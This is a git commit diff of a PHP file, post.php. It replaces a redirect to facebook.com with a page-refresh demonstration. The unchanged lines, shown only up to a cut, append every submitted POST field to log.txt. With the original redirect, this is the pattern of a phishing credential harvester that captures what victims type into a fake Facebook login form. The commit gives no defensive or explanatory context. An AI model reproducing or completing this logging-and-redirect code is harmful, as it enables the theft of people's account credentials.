455585f857431a7a7c8c8a6d78716ac45db4b432
Static CDN <57913796+staticfilehost@users.noreply.github.com>
2019-11-19 02:25:47 -0800

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,18 @@
 <?php
-header ('Location: facebook.com');
+// Demonstrate the use of header() function 
+// to refresh the current page 
+   
+echo "Welcome to index page</br>"; 
+echo "Page will refresh in every 3 seconds</br></br>"; 
+    
+// The function will refresh the page  
+// in every 3 second 
+header("refresh: 3"); 
+    
+echo date('H:i:s Y-m-d'); 
+  
+exit; 
+?>
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
